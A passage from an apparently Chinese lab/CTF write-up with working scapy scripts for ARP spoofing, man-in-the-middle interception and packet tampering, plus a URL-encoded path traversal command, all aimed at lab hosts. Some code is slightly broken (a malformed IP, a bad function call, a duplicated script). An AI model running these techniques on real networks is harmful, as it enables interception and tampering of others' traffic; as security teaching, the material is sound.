class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置源和目标信息</span></span><br><span class="line">source_ip = <span class="string">&#x27;10.0.0.2&#x27;</span>  <span class="comment"># 本地IP地址（根据实际情况修改）</span></span><br><span class="line">dest_ip = <span class="string">&#x27;10.0.0.3&#x27;</span>    <span class="comment"># 目标IP地址</span></span><br><span class="line">source_port = <span class="number">31337</span>  <span class="comment"># 源端口</span></span><br><span class="line">dest_port = <span class="number">31337</span>  <span class="comment"># 目标端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要使用的网络接口</span></span><br><span class="line"><span class="comment"># conf.iface = &quot;eth0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送SYN包</span></span><br><span class="line">syn = IP(src=source_ip, dst=dest_ip) / TCP(sport=source_port, dport=dest_port, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">31337</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sending SYN packet: <span class="subst">&#123;syn.summary()&#125;</span>&quot;</span>)</span><br><span class="line">syn_ack = sr1(syn, timeout=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> syn_ack <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No SYN-ACK received. The target might be unreachable or blocked by a firewall.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试捕获收到的所有包</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sniffing for packets...&quot;</span>)</span><br><span class="line">    sniffed_packets = sniff(iface=<span class="string">&quot;eth0&quot;</span>, count=<span class="number">10</span>, timeout=<span class="number">100</span>)  <span class="comment"># 捕获最多10个包，或等待10秒</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sniffed_packets) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> sniffed_packets:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Captured a packet:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(packet.show())  <span class="comment"># 显示每个数据包的详细结构</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No packets captured.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;收到SYN-ACK包，序列号: <span class="subst">&#123;syn_ack.seq&#125;</span>, 确认号: <span class="subst">&#123;syn_ack.ack&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 发送ACK包</span></span><br><span class="line">    ack = IP(src=source_ip, dst=dest_ip) / TCP(sport=source_port, dport=dest_port, flags=<span class="string">&#x27;A&#x27;</span>, seq=syn_ack.ack, ack=syn_ack.seq + <span class="number">1</span>)</span><br><span class="line">    send(ack)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ACK包已发送到 <span class="subst">&#123;dest_ip&#125;</span>:<span class="subst">&#123;dest_port&#125;</span> via <span class="subst">&#123;conf.iface&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-12-Manually-send-an-Address-Resolution-Protocol-packet"><a href="#2-12-Manually-send-an-Address-Resolution-Protocol-packet" class="headerlink" title="2.12 Manually send an Address Resolution Protocol packet"></a>2.12 Manually send an Address Resolution Protocol packet</h3><p>这个也是一样的，要先通过<code>ip addr add 10.0.0.2/24 dev eth0</code>设置网络接口的ipv4地址，然后执行脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义发送方的MAC地址和IP地址</span></span><br><span class="line">sender_mac = <span class="string">&quot;4e:d3:8e:16:1f:7e&quot;</span>  <span class="comment"># 发送方的MAC地址（可以根据实际情况更改）</span></span><br><span class="line">sender_ip = <span class="string">&quot;10.0.0.2&quot;</span>  <span class="comment"># 发送方的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标主机的IP地址</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建ARP包</span></span><br><span class="line">arp_packet = ARP(op=<span class="string">&quot;is-at&quot;</span>, hwsrc=sender_mac, psrc=sender_ip, pdst=target_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送ARP包</span></span><br><span class="line">send(arp_packet)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ARP包已发送到 <span class="subst">&#123;target_ip&#125;</span>，告知其 <span class="subst">&#123;sender_ip&#125;</span> 的MAC地址是 <span class="subst">&#123;sender_mac&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-13-Hijack-traffic-from-a-remote-host-using-ARP"><a href="#2-13-Hijack-traffic-from-a-remote-host-using-ARP" class="headerlink" title="2.13 Hijack traffic from a remote host using ARP"></a>2.13 Hijack traffic from a remote host using ARP</h3><p>一开始我们使用tcpdump -i eth0 监听本机网络接口eth0上是得不到任何数据的。现在执行ARP欺诈：</p><p><strong>构造 ARP 响应包</strong>:</p><ul><li><code>ARP(op=2, ...)</code> 构造了一个 ARP 响应包，其中 <code>op=2</code> 表示这是一个 ARP 回复（即 “is-at”）。</li><li><code>pdst=target_ip</code> 设置了目标主机的 IP 地址，即这个 ARP 包将发送到哪个 IP 地址。</li><li><code>hwdst=getmacbyip(target_ip)</code> 获取目标主机的 MAC 地址，并将其设置为 ARP 包中的目标硬件地址（即目标 MAC 地址）。</li><li><code>psrc=spoof_ip</code> 设置了伪装的 IP 地址，告诉目标主机这个 IP 地址现在与发送者的 MAC 地址相关联。</li><li><code>hwsrc=my_mac</code> 设置了发送者的 MAC 地址（攻击者的 MAC 地址），这是你希望目标主机将 <code>spoof_ip</code> 关联的地址。</li></ul><p><strong>发送 ARP 包</strong>:</p><ul><li><code>send(arp_response, verbose=False)</code> 发送这个伪造的 ARP 响应包。<code>verbose=False</code> 表示在发送时不输出详细信息。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标主机信息</span></span><br><span class="line">target1_ip = <span class="string">&quot;10.0.0.4&quot;</span>  <span class="comment"># 远程主机1</span></span><br><span class="line">target2_ip = <span class="string">&quot;10.0.0.2&quot;</span>  <span class="comment"># 远程主机2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机信息</span></span><br><span class="line">my_mac = <span class="string">&quot;c2:fa:63:2e:21:fb&quot;</span>  <span class="comment"># 替换为你的实际MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>(<span class="params">target_ip, spoof_ip</span>):</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip, hwsrc=my_mac)</span><br><span class="line">    send(arp_response, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_arp</span>(<span class="params">target_ip, real_mac, spoof_ip</span>):</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=real_mac, psrc=spoof_ip, hwsrc=getmacbyip(spoof_ip))</span><br><span class="line">    send(arp_response, count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始 ARP 欺骗... 按 Ctrl+C 停止.&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        arp_spoof(target1_ip, target2_ip)</span><br><span class="line">        arp_spoof(target2_ip, target1_ip)</span><br><span class="line">        time.sleep(<span class="number">2</span>)  <span class="comment"># 每2秒发送一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 停止 ARP 欺骗，恢复网络设置...&quot;</span>)</span><br><span class="line">    restore_arp(target1_ip, getmacbyip(target1_ip), target2_ip)</span><br><span class="line">    restore_arp(target2_ip, getmacbyip(target2_ip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 完成.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后再次监听eth0会得到：</p><blockquote><p>oot@ip-10-0-0-3:~# tcpdump -i eth0<br>tcpdump: verbose output suppressed, use -v[v]… for full protocol decode<br>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes<br>12:19:48.138491 IP 10.0.0.2.31337 &gt; 10.0.0.4.42118: Flags [S.], seq 1016474819, ack 1875635199, win 65160, options [mss 1460,sackOK,TS val 3852132867 ecr 3986586317,nop,wscale 7], length 0<br>12:19:48.138517 IP 10.0.0.2.31337 &gt; 10.0.0.4.42118: Flags [S.], seq 1016474819, ack 1875635199, win 65160, options [mss 1460,sackOK,TS val 3852132867 ecr 3986586317,nop,wscale 7], length 0<br>12:19:52.302521 IP 10.0.0.2.31337 &gt; 10.0.0.4.421</p></blockquote><p>最后通过下面的代码获取捕捉到的包的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 IP 地址和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.2&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义捕获数据包的过滤器</span></span><br><span class="line">filter_str = <span class="string">f&quot;tcp and (host <span class="subst">&#123;target_ip&#125;</span> or host <span class="subst">&#123;remote_ip&#125;</span>) and port <span class="subst">&#123;target_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理数据包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        tcp_layer = packet[TCP]</span><br><span class="line">        ip_layer = packet[IP]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 收到TCP包，从 <span class="subst">&#123;ip_layer.src&#125;</span>:<span class="subst">&#123;tcp_layer.sport&#125;</span> 到 <span class="subst">&#123;ip_layer.dst&#125;</span>:<span class="subst">&#123;tcp_layer.dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据内容: <span class="subst">&#123;packet[Raw].load&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用sniff捕获数据包并调用回调函数处理</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=filter_str, iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic"><a href="#2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic" class="headerlink" title="2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic"></a>2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</h3><p>这是一个经典的中间人攻击，我们要使用arp欺诈拦截服务器<code>10.0.0.3</code>与客户端<code>10.0.0.4</code>之间的通信并篡改以获取flag：</p><ul><li><p>首先通过ifconfig命令获取网络接口eth0的mac地址，之后执行脚本实现arp欺诈：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标和受害者的IP地址</span></span><br><span class="line">victim_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line">my_mac = <span class="string">&quot;86:a6:ab:d4:f3:c2&quot;</span>  <span class="comment"># 获取当前接口的MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>(<span class="params">victim_ip, spoof_ip</span>):</span><br><span class="line">    victim_mac = getmacbyip(victim_ip)</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=my_mac)</span><br><span class="line">    send(arp_response, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定期发送ARP包维持欺骗状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            arp_spoof(victim_ip, target_ip)  <span class="comment"># 欺骗victim_ip，使其认为target_ip对应的MAC是我的MAC</span></span><br><span class="line">            arp_spoof(target_ip, victim_ip)  <span class="comment"># 欺骗target_ip，使其认为victim_ip对应的MAC是我的MAC</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] 停止ARP欺骗，恢复网络设置...&quot;</span>)</span><br><span class="line">        <span class="comment"># restore_network()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_network</span>():</span><br><span class="line">    victim_mac = getmacbyip(victim_ip)</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac), count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac), count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">spoof()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>然后我们可以通过下面的脚本查看通信内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 IP 地址和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3s&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义捕获数据包的过滤器</span></span><br><span class="line">filter_str = <span class="string">f&quot;tcp and (host <span class="subst">&#123;target_ip&#125;</span> or host <span class="subst">&#123;remote_ip&#125;</span>) and port <span class="subst">&#123;target_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理数据包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        tcp_layer = packet[TCP]</span><br><span class="line">        ip_layer = packet[IP]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 收到TCP包，从 <span class="subst">&#123;ip_layer.src&#125;</span>:<span class="subst">&#123;tcp_layer.sport&#125;</span> 到 <span class="subst">&#123;ip_layer.dst&#125;</span>:<span class="subst">&#123;tcp_layer.dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据内容: <span class="subst">&#123;packet[Raw].load&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用sniff捕获数据包并调用回调函数处理</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=filter_str, iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>接着使用下面的命令，用来丢弃所有E开头的数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tc qdisc add dev eth0 root handle 1: prio</span><br><span class="line">sudo tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match u8 0x45 0xff at 52 action drop</span><br></pre></td></tr></table></figure></li><li><p>最后执行下脚本篡改数据包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储已发送修改数据包的信息</span></span><br><span class="line">sent_packets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        <span class="comment"># 获取并打印TCP包中的原始数据</span></span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            data = packet[Raw].load</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] TCP包从 <span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[TCP].sport&#125;</span> 到 <span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;packet[TCP].dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据是 &#x27;ECHO\n&#x27;，我们进行修改</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;ECHO\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 检测到 ECHO 命令，准备将其修改为 FLAG&quot;</span>)</span><br><span class="line">            <span class="comment"># 修改 ECHO 为 FLAG</span></span><br><span class="line">            modified_data = <span class="string">b&#x27;FLAG\n&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 修改后的数据内容: <span class="subst">&#123;modified_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建修改后的数据包，继承原始的序列号、确认号等信息</span></span><br><span class="line">            original_flags = packet[TCP].flags</span><br><span class="line">            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \</span><br><span class="line">                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=original_flags) / \</span><br><span class="line">                         modified_data</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重置校验和，确保重新计算</span></span><br><span class="line">            new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储已发送修改数据包的信息</span></span><br><span class="line">sent_packets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        <span class="comment"># 获取并打印TCP包中的原始数据</span></span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            data = packet[Raw].load</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] TCP包从 <span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[TCP].sport&#125;</span> 到 <span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;packet[TCP].dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据是 &#x27;ECHO\n&#x27;，我们进行修改</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;ECHO\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 检测到 ECHO 命令，准备将其修改为 FLAG&quot;</span>)</span><br><span class="line">            <span class="comment"># 修改 ECHO 为 FLAG</span></span><br><span class="line">            modified_data = <span class="string">b&#x27;FLAG\n&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 修改后的数据内容: <span class="subst">&#123;modified_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建修改后的数据包，继承原始的序列号、确认号等信息</span></span><br><span class="line">            original_flags = packet[TCP].flags</span><br><span class="line">            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \</span><br><span class="line">                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=original_flags) / \</span><br><span class="line">                         modified_data</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重置校验和，确保重新计算</span></span><br><span class="line">            new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-Web-Security"><a href="#3-Web-Security" class="headerlink" title="3 Web Security"></a>3 Web Security</h2><h3 id="3-1-PATH-Traversal-1"><a href="#3-1-PATH-Traversal-1" class="headerlink" title="3.1 PATH Traversal 1"></a>3.1 PATH Traversal 1</h3><p>通过<code>/challenge/server</code>启动服务器后会有一个网页，同时可以通过 <code>ls /</code>命令看见在目录<code>/</code>下的<code>flag</code>文件夹。最后通过 URL 编码的路径遍历：<code>curl -v http://challenge.localhost:80/%2e%2e/%2e%2e/flag</code>获得<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 